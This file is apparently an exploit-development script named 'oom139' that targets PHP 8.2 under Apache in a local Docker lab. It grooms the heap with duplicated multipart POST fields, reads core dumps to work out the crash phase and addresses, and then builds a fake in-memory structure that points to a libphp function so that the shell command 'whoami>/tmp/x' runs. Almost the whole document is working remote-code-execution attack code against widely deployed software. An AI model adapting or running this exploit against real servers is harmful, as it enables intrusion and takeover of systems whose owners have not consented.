#!/usr/bin/env python3
"""oom139: PAIRED-RING ARM — value strings freed mid-request carry B.

Walls proven: (1) names truncate at NUL -> never carry a pointer; (2) warm
posts can't season the next request (fresh emalloc arena per request).
Physics kept: crash tail = recycled 3KB chunks freed DURING the fatal parse.

NEW SEED: each part name appears TWICE ("p<k>" twice). PHP multipart stores
into $_POST by name -> 2nd occurrence overwrites -> old 3060-byte value
zend_string EFREE'D mid-request. ~800+ freed RING chunks ([0xDE*8][ptr]*n,
binary-safe) fill the exact bin the arData tail recycles. Values carry B's
00 00 bytes legally. Unique names keep arData long (walk reaches tail).
Ring ptr: measure = SIG8 (noncanonical -> crash reveals trip phase);
arm = cell(B) rotated so the tripped slice reads B exactly.
Block: oom116 layout overlaid at OFF in alive tag part's value; B = A+OFF.
Win: test -f /tmp/x after every fire.
"""
import struct, subprocess, time, urllib.request, urllib.error, re, sys

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
TAG_PART = "tagpart"
NPAIRS = 2100                     # 4200 parts, each name twice
VLEN = 3060
CORE = "/tmp/core.139"
BASE = 0

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell(addr):
    return struct.pack("<Q", addr)

def ring_value(ptr8):
    """3060 bytes: ptr8 at every value offset v = 8 mod 16."""
    v = bytearray(b"\xde" * VLEN)
    for s in range(8, VLEN - 8, 16):
        v[s:s + 8] = ptr8
    return bytes(v)

def tag_value(i, B=None, OFF=0, arm=False):
    if not arm:
        return struct.pack("<QQ", MAGIC + i, MAGIC + i) + b"v" * (1537 - 32)
    v = bytearray(b"v" * 1537)
    v[0:16] = struct.pack("<QQ", MAGIC + i, MAGIC + i)
    st = struct.pack_into
    st("<II", v, OFF + 0x00, 1, 0x108)
    st("<II", v, OFF + 0x08, 1, 0)
    st("<Q", v, OFF + 0x10, 0)
    st("<Q", v, OFF + 0x18, B + 0x68)
    st("<I", v, OFF + 0x2C, 1)
    st("<Q", v, OFF + 0x50, B + 0x90)
    v[OFF + 0x58] = 6
    st("<I", v, OFF + 0x5C, 0x106)
    st("<Q", v, OFF + 0x68, 0)
    st("<Q", v, OFF + 0x70, BASE + ZIF)
    st("<IIQQ", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
    v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return bytes(v)

def part_header(name):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + name + b'"\r\n\r\n')

def body(B=None, OFF=0, arm=False, ptr8=SIG8):
    rv = ring_value(ptr8)
    parts = [part_header(b"tagpart"), tag_value(830, B, OFF, arm), b"\r\n"]
    for k in range(NPAIRS):
        h = part_header(b"p%d" % k)
        parts.append(h); parts.append(rv); parts.append(b"\r\n")
        parts.append(h); parts.append(rv); parts.append(b"\r\n")
    parts.append(b"--BOUND--\r\n")
    return b"".join(parts)

def pull_core():
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c",
                        "ls -t /tmp/core* 2>/dev/null | head -1"], capture_output=True, timeout=60)
    src = r.stdout.decode().strip()
    if not src:
        return None
    subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", "rm -f " + CORE], capture_output=True)
    subprocess.run(["docker", "cp", "php_vuln:" + src, "phpbuild:" + CORE], capture_output=True)
    m = subprocess.run(["docker", "exec", "phpbuild", "md5sum", CORE], capture_output=True)
    print("core:", src, m.stdout.decode().strip()[:40])
    return CORE

RDI_SCRIPT = r"""
import struct, sys
f = open(sys.argv[1], 'rb').read()
i = f.find(b'CORE')
while i != -1:
    namesz, descsz, typ = struct.unpack_from('<III', f, i - 8)
    if typ == 1 and descsz > 200:
        regs = struct.unpack_from('<27Q', f, i + 32)
        print('RDI=0x%x' % regs[1]); break
    i = f.find(b'CORE', i + 4)
"""

def rdi_of(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", RDI_SCRIPT, core],
                       capture_output=True, timeout=120)
    m = re.search(r"RDI=0x([0-9a-f]+)", r.stdout.decode())
    return int(m.group(1), 16) if m else None

def tag_addr(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c",
                        "import struct,sys;f=open(sys.argv[1],'rb').read()"
                        ";t=struct.pack('<QQ',%d,%d);j=f.find(t);print('FILEOFF=0x%x'%%j if j>=0 else 'NO')"
                        % (MAGIC + 830, MAGIC + 830, 0), core],
                       capture_output=True, timeout=120)
    m = re.search(r"FILEOFF=0x([0-9a-f]+)", r.stdout.decode())
    return int(m.group(1), 16) if m else None

def aim(A):
    for OFF in range(0x40, 1537 - 0xB8, 16):
        B = A + OFF
        if B % 16 == 8 and (B >> 56) == 0 and ((B >> 8) & 1) == 1 and ((B >> 9) & 1) == 0:
            return B, OFF
    return None, None

def phase_of(rdi):
    rb = struct.pack("<Q", rdi)
    for p in range(16):
        if (SIG8 + SIG8)[p:p + 8] == rb:
            return p
    return None

def main():
    global BASE
    print("=== oom139: paired-ring arm ===")
    c, o = get(HOST + "/oom_sapi.php")
    print("sapi:", o.strip()[:60])
    assert sh("md5sum /usr/lib/apache2/modules/libphp.so").split()[0] == STOCK_MD5
    print("md5 ok")
    assert recreate(), "recreate failed"
    BASE = base_now()
    print("base=0x%x" % BASE)

    m_body = body()
    print("measure body=%d" % len(m_body))

    # ---- measure: SIG8 rings -> crash reveals trip phase; tag gives A ----
    rdi = A = None
    for t in range(4):
        c, o = post_mod(m_body)
        xs = x_state()
        print("meas t%d: http=%s segv+%d %s" % (t, c, segv_count(), xs))
        if xs.startswith("X_EXISTS"):
            print("*** WON in measure?! ***", xs); return
        if c == -1 or segv_count():
            core = pull_core()
            if core:
                rdi = rdi_of(core)
                fo = tag_addr(core)
                print("meas core: rdi=0x%x phase=%s tag@file=0x%x" %
                      (rdi if rdi else 0, phase_of(rdi) if rdi else None, fo if fo else -1))
            break
        time.sleep(2)
    if rdi is None:
        print("no measure crash -> abort"); print("final x:", x_state()); print("=== done ==="); return
    p = phase_of(rdi)
    if p is None:
        print("rdi not ring bytes -> layout surprise -> abort"); print("final x:", x_state()); print("=== done ==="); return
    # tag vaddr: map file offset via core segments
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", """
import struct, sys
f = open(sys.argv[1], 'rb').read()
t = struct.pack('<QQ', %d, %d)
j = f.find(t)
if j < 0:
    print('NO'); sys.exit()
e_phoff = struct.unpack_from('<Q', f, 0x20)[0]
e_phentsize, e_phnum = struct.unpack_from('<HH', f, 0x36)
for k in range(e_phnum):
    off = e_phoff + k * e_phentsize
    p_type, p_flags, p_off, p_vaddr, p_paddr, p_filesz = struct.unpack_from('<IIQQQQ', f, off)
    if p_type == 1 and p_off <= j < p_off + p_filesz:
        print('A=0x%%x' %% (p_vaddr + (j - p_off))); break
""" % (MAGIC + 830, MAGIC + 830), CORE], capture_output=True, timeout=120)
    mA = re.search(r"A=0x([0-9a-f]+)", r.stdout.decode())
    if not mA:
        print("no tag anchor"); print("final x:", x_state()); print("=== done ==="); return
    A = int(mA.group(1), 16)
    B, OFF = aim(A)
    if B is None:
        print("aim failed (A=0x%x)" % A); print("final x:", x_state()); print("=== done ==="); return
    print("phase=%d A=0x%x B=0x%x OFF=0x%x" % (p, A, B, OFF))

    # ---- arm: rings rotated so tripped slice reads exactly B ----
    rot = (8 - p) % 16                     # place cell(B) so rdi window catches it
    rvb = bytearray(b"\xde" * VLEN)
    b8 = cell(B)
    for s in range(rot, VLEN - 8, 16):
        rvb[s:s + 8] = b8
    a_body = body(B=B, OFF=OFF, arm=True, ptr8=bytes(rvb))
    assert len(a_body) == len(m_body), "drift %d" % (len(a_body) - len(m_body))
    for t in range(6):
        c, o = post_mod(a_body)
        xs = x_state()
        print("arm t%d: http=%s segv+%d %s" % (t, c, segv_count(), xs))
        if xs.startswith("X_EXISTS"):
            print("*** WON *** %s" % xs); return
        if segv_count():
            core = pull_core()
            if core:
                r = rdi_of(core)
                print("arm crash rdi=0x%x want=0x%x %s" % (r if r else 0, B,
                      "MATCH" if r == B else "MISS"))
        time.sleep(2)
    print("final x:", x_state())
    print("=== done ===")

if __name__ == "__main__":
    main()
